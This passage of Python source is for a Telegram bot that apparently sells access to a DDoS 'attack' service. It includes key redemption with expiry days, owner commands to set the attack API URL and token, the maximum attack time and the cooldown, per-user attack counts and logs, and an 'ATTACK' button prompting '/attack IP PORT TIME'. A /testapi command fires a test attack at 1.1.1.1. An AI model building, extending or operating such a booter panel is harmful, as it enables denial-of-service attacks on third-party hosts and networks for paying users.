    if kinfo.get("used"):
        bot.reply_to(msg, "❌ <b>ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ!</b>", parse_mode="HTML"); return

    days = kinfo["days"]
    expiry = datetime.now() + timedelta(days=days)
    data["users"].setdefault(str(uid), {})
    existing = data["users"][str(uid)].get("key_expiry")
    if existing:
        try:
            old_exp = datetime.fromisoformat(existing)
            if old_exp > datetime.now():
                expiry = old_exp + timedelta(days=days)
        except: pass
    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
    kinfo["used"] = True; kinfo["used_by"] = uid
    kinfo["used_at"] = datetime.now().isoformat()
    save_data(data)

    bot.reply_to(msg,
        f"✅ <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍᴇᴅ!</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"⏰ ᴀᴅᴅᴇᴅ: <b>+{days} ᴅᴀʏꜱ</b>\n"
        f"📅 ᴇxᴘɪʀᴇꜱ: <b>{expiry.strftime('%d %b %Y %H:%M')}</b>\n"
        f"━━━━━━━━━━━━━",
        parse_mode="HTML")


# ============= OWNER PANEL =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg,
        "╔══════════════════════════╗\n"
        "║   👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 👑   ║\n"
        "╚══════════════════════════╝\n\n"
        "📋 <b>ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ:</b>\n\n"
        "👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
        "👥 /users ➪ ᴜꜱᴇʀꜱ ʟɪꜱᴛ\n"
        "📊 /stats ➪ ꜱᴛᴀᴛꜱ\n"
        "📢 /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
        "🚫 /ban ID ➪ ʙᴀɴ ᴜꜱᴇʀ\n"
        "✅ /unban ID ➪ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n"
        "🔑 /genkey DAYS AMT ➪ ɢᴇɴ ᴋᴇʏꜱ\n"
        "📡 /setapi ➪ ꜱᴇᴛ ᴀᴘɪ\n"
        "🧪 /testapi ➪ ᴛᴇꜱᴛ ᴀᴘɪ\n"
        "⏱️ /setmaxtime SEC ➪ ᴍᴀx ᴛɪᴍᴇ\n"
        "⏸️ /setcooldown SEC ➪ ᴄᴏᴏʟᴅᴏᴡɴ\n"
        "🔧 /maintenance ➪ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ\n"
        "⚙️ /settings ➪ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ",
        parse_mode="HTML")


@bot.message_handler(commands=['users'])
def cmd_users(msg):
    if not is_owner(msg.from_user.id): return
    if not data["users"]:
        bot.reply_to(msg, "📂 ɴᴏ ᴜꜱᴇʀꜱ."); return
    txt = "👥 <b>ᴜꜱᴇʀꜱ ʟɪꜱᴛ</b>\n━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(list(data["users"].items())[:50], 1):
        txt += f"{i}. <code>{uid}</code> | {u.get('total_attacks', 0)} ᴀᴛᴛᴀᴄᴋꜱ\n"
    bot.reply_to(msg, txt, parse_mode="HTML")


@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=1)
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ /broadcast MSG"); return
    text = p[1]; sent = 0
    for uid in data["users"]:
        try:
            bot.send_message(int(uid), f"📢 <b>ʙʀᴏᴀᴅᴄᴀꜱᴛ</b>\n\n{text}", parse_mode="HTML")
            sent += 1
        except: pass
    bot.reply_to(msg, f"✅ ꜱᴇɴᴛ ᴛᴏ {sent} ᴜꜱᴇʀꜱ.")


@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
        "📊 <b>ʙᴏᴛ ꜱᴛᴀᴛꜱ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴜꜱᴇʀꜱ: <b>{len(data['users'])}</b>\n"
        f"🔑 ᴋᴇʏꜱ: <b>{len(data['keys'])}</b>\n"
        f"💀 ᴀᴛᴛᴀᴄᴋꜱ: <b>{len(data['attack_logs'])}</b>\n"
        f"❄ ꜱᴛɪᴄᴋᴇʀꜱ: <b>{len(data.get('stickers', []))}</b>\n"
        f"📹 ᴠɪᴅᴇᴏꜱ: <b>{len(data.get('videos', []))}</b>\n"
        f"🎬 ᴘʏꜰ ᴠɪᴅᴇᴏꜱ: <b>{len(data.get('pyf_videos', []))}</b>\n"
        f"⏱️ ᴜᴘᴛɪᴍᴇ: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")


@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /ban ID"); return
    data["banned_users"][p[1]] = datetime.now().isoformat()
    save_data(data)
    bot.reply_to(msg, f"✅ <b>ʙᴀɴɴᴇᴅ</b> <code>{p[1]}</code>", parse_mode="HTML")


@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /unban ID"); return
    if p[1] in data["banned_users"]:
        del data["banned_users"][p[1]]; save_data(data)
        bot.reply_to(msg, f"✅ <b>ᴜɴʙᴀɴɴᴇᴅ</b> <code>{p[1]}</code>", parse_mode="HTML")
    else:
        bot.reply_to(msg, "❌ ɴᴏᴛ ʙᴀɴɴᴇᴅ")


@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 3: bot.reply_to(msg, "⚠️ /setapi URL TOKEN"); return
    set_setting("api_url", p[1]); set_setting("api_token", p[2])
    if len(p) > 3: set_setting("api_method", p[3])
    if len(p) > 4: set_setting("api_geolocation", p[4])
    bot.reply_to(msg, "✅ <b>ᴀᴘɪ ᴜᴘᴅᴀᴛᴇᴅ!</b>", parse_mode="HTML")


@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    if not is_owner(msg.from_user.id): return
    ok, r = api_attack("1.1.1.1", 80, 5)
    if ok: bot.reply_to(msg, f"✅ <b>ᴀᴘɪ ᴏᴋ</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
    else: bot.reply_to(msg, f"❌ <b>ᴀᴘɪ ꜰᴀɪʟᴇᴅ</b>\n<code>{r[:300]}</code>", parse_mode="HTML")


@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setmaxtime SEC"); return
    try:
        set_setting("max_attack_time", int(p[1]))
        bot.reply_to(msg, f"✅ <b>ᴍᴀx ᴛɪᴍᴇ:</b> {p[1]}ꜱ", parse_mode="HTML")
    except:
        bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ")


@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setcooldown SEC"); return
    try:
        set_setting("user_cooldown", int(p[1]))
        bot.reply_to(msg, f"✅ <b>ᴄᴏᴏʟᴅᴏᴡɴ:</b> {p[1]}ꜱ", parse_mode="HTML")
    except:
        bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ")


@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    if not is_owner(msg.from_user.id): return
    cur = get_setting('maintenance_mode', False)
    set_setting("maintenance_mode", not cur)
    bot.reply_to(msg, f"✅ <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ:</b> {'ᴏɴ' if not cur else 'ᴏꜰꜰ'}", parse_mode="HTML")


# ============= STICKER COMMANDS =============
@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["stickers"]:
            bot.reply_to(msg, "❄ ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ ʜᴀɪ.")
            return
        txt = "❄ <b>ꜱᴛɪᴄᴋᴇʀꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, s in enumerate(data["stickers"], 1):
            txt += f"{i}. <code>{s}</code>\n"
        txt += "\n❌ ʀᴇᴍᴏᴠᴇ: <code>/removesticker NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["stickers"]):
            data["stickers"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ <b>ꜱᴛɪᴄᴋᴇʀ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n❄ ᴛᴏᴛᴀʟ: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except:
        bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/removesticker NUMBER</code>", parse_mode="HTML")


@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        bot.reply_to(msg, "❄ ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ ʜᴀɪ.")
        return
    txt = "❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦\n"
    for i, s in enumerate(data["stickers"], 1):
        txt += f"{i}. {s}\n"
    txt += f"\n🔹 ᴛᴏᴛᴀʟ {len(data['stickers'])}"
    bot.reply_to(msg, txt)


# ============= VIDEO COMMANDS =============
@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        bot.reply_to(msg, "📹 ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ.")
        return
    txt = "📹 🇻 🇮 🇩 🇪 🇴 🇸 ：\n"
    for i, v in enumerate(data["videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ ᴛᴏᴛᴀʟ ： {len(data['videos'])}"
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["videos"]:
            bot.reply_to(msg, "📹 ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ.")
            return
        txt = "📹 <b>ᴠɪᴅᴇᴏꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ ᴅᴇʟᴇᴛᴇ: <code>/delvideo NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["videos"]):
            data["videos"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴠɪᴅᴇᴏ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n📹 ᴛᴏᴛᴀʟ: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except:
        bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/delvideo NUMBER</code>", parse_mode="HTML")


# ============= PYF VIDEO COMMANDS =============
@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    if not is_owner(msg.from_user.id): return
    _pending_pyf[msg.from_user.id] = True
    bot.reply_to(msg, "📤 <b>ᴀʙ ᴇᴋ ᴠɪᴅᴇᴏ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀᴏ.</b>", parse_mode="HTML")


@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        bot.reply_to(msg, "🎬 ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ.")
        return
    txt = "🎬 🇵 🇾 🇫 ᴠɪᴅᴇᴏꜱ ：\n"
    for i, v in enumerate(data["pyf_videos"], 1):
        txt += f"🛸{i} {v}\n"
    txt += f"\n⎘ ᴛᴏᴛᴀʟ ： {len(data['pyf_videos'])}"
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["pyf_videos"]:
            bot.reply_to(msg, "🎬 ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ.")
            return
        txt = "🎬 <b>ᴘʏꜰ ᴠɪᴅᴇᴏꜱ ʟɪꜱᴛ:</b>\n━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["pyf_videos"], 1):
            txt += f"{i}. <code>{v}</code>\n"
        txt += "\n❌ ᴅᴇʟᴇᴛᴇ: <code>/delpyf NUMBER</code>"
        bot.reply_to(msg, txt, parse_mode="HTML")
        return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["pyf_videos"]):
            data["pyf_videos"].pop(idx)
            save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴘʏꜰ ᴠɪᴅᴇᴏ #{p[1]} ʀᴇᴍᴏᴠᴇᴅ!</b>\n🎬 ᴛᴏᴛᴀʟ: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!")
    except:
        bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/delpyf NUMBER</code>", parse_mode="HTML")


# ============= AUTO STICKER =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.sticker.file_id
    if file_id not in data["stickers"]:
        data["stickers"].append(file_id)
        save_data(data)
        bot.reply_to(msg, f"✅ <b>ꜱᴛɪᴄᴋᴇʀ ᴀᴅᴅᴇᴅ!</b>\n❄ ᴛᴏᴛᴀʟ: <b>{len(data['stickers'])}</b>", parse_mode="HTML")
    else:
        bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")


# ============= VIDEO HANDLER =============
_pending_pyf = {}

@bot.message_handler(content_types=['video'])
def handle_video(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.video.file_id

    if _pending_pyf.get(uid):
        _pending_pyf[uid] = False
        if file_id not in data["pyf_videos"]:
            data["pyf_videos"].append(file_id)
            save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴘʏꜰ ᴠɪᴅᴇᴏ ᴀᴅᴅᴇᴅ!</b>\n🎬 ᴛᴏᴛᴀʟ: <b>{len(data['pyf_videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")
    else:
        if file_id not in data["videos"]:
            data["videos"].append(file_id)
            save_data(data)
            bot.reply_to(msg, f"✅ <b>ᴠɪᴅᴇᴏ ᴀᴅᴅᴇᴅ!</b>\n📹 ᴛᴏᴛᴀʟ: <b>{len(data['videos'])}</b>", parse_mode="HTML")
        else:
            bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")


# ============= SETTINGS COMMAND =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
        "⚙️ <b>ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👑 <b>ᴏᴡɴᴇʀ</b>\n"
        "┣ /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
        "┣ /users ➪ ᴜꜱᴇʀꜱ ʟɪꜱᴛ\n"
        "┣ /stats ➪ ꜱᴛᴀᴛꜱ\n"
        "┣ /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
        "┣ /ban ID ➪ ʙᴀɴ\n"
        "┗ /unban ID ➪ ᴜɴʙᴀɴ\n\n"
        "🔑 <b>ᴋᴇʏ</b>\n"
        "┣ /genkey DAYS [AMT] [NAME] ➪ ɢᴇɴ ᴋᴇʏꜱ\n"
        "┗ /redeem KEY ➪ ʀᴇᴅᴇᴇᴍ\n\n"
        "📡 <b>ᴀᴘɪ</b>\n"
        "┣ /setapi URL TOKEN [method] [geo]\n"
        "┣ /testapi ➪ ᴛᴇꜱᴛ\n"
        "┣ /setmaxtime SEC ➪ ᴍᴀx ᴛɪᴍᴇ\n"
        "┗ /setcooldown SEC ➪ ᴄᴏᴏʟᴅᴏᴡɴ\n\n"
        "🔧 <b>ʙᴏᴛ</b>\n"
        "┗ /maintenance ➪ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ\n\n"
        "❄ <b>ꜱᴛɪᴄᴋᴇʀ</b>\n"
        "┣ ꜱᴇɴᴅ ꜱᴛɪᴄᴋᴇʀ ➪ ᴀᴜᴛᴏ ᴀᴅᴅ\n"
        "┣ /removesticker NUMBER\n"
        "┗ /liststickers\n\n"
        "📹 <b>ᴠɪᴅᴇᴏ</b>\n"
        "┣ ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ➪ ᴀᴜᴛᴏ ᴀᴅᴅ\n"
        "┣ /listvideo\n"
        "┗ /delvideo NUMBER\n\n"
        "🎬 <b>ᴘʏꜰ ᴠɪᴅᴇᴏ</b>\n"
        "┣ /addpyf ➪ ᴀᴅᴅ\n"
        "┣ /listpyf\n"
        "┗ /delpyf NUMBER\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")


# ============= BUTTONS =============
@bot.message_handler(func=lambda m: m.text == "🔥 𝐀𝐓𝐓𝐀𝐂𝐊")
def btn_attack(msg):
    bot.reply_to(msg, "🎯 <code>/attack IP PORT TIME</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
def btn_status(msg): cmd_status(msg)

@bot.message_handler(func=lambda m: m.text == "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
def btn_profile(msg): cmd_profile(msg)

@bot.message_handler(func=lambda m: m.text == "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
def btn_owner(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg, "👑 <b>ᴘᴀɴᴇʟ</b>", reply_markup=kb_owner(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 𝐑𝐄𝐃𝐄𝐄𝐌")
def btn_redeem(msg):
    bot.reply_to(msg, "🔑 <code>/redeem KEY</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 𝐆𝐄𝐍 𝐊𝐄𝐘")
def btn_genkey(msg):
    bot.reply_to(msg, "🔑 <code>/genkey DAYS AMOUNT [NAME]</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐒")
def btn_stats(msg): cmd_stats(msg)

@bot.message_handler(func=lambda m: m.text == "👥 𝐔𝐒𝐄𝐑𝐒")
def btn_users(msg): cmd_users(msg)

@bot.message_handler(func=lambda m: m.text == "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
def btn_broadcast(msg):
    bot.reply_to(msg, "📢 <code>/broadcast MSG</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒")
def btn_settings(msg): cmd_settings(msg)

@bot.message_handler(func=lambda m: m.text == "❌ 𝐂𝐋𝐎𝐒𝐄")
def btn_close(msg):
    bot.reply_to(msg, "❌ <b>ᴄʟᴏꜱᴇᴅ.</b>", reply_markup=kb_main(msg.from_user.id), parse_mode="HTML")


# ============= MAIN =============
print("=" * 55)
print(f"  {BOT_NAME}")
print("=" * 55)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  📡 API: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"  ⏱️ Max Time: {get_setting('max_attack_time', 300)}s")
print(f"  ⏸️ Cooldown: {get_setting('user_cooldown', 5)}s")
print("=" * 55)
print("  ✅ Bot running...")
print("=" * 55)

while True:
    try:
        bot.remove_webhook()
        time.sleep(0.5)
        bot.polling(
            none_stop=True,
            interval=0,
            timeout=20,
            long_polling_timeout=15,
            allowed_updates=["message", "callback_query"]
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
        break
    except Exception as e:
        print(f"⚠️ Polling Error: {e}")
        time.sleep(3)
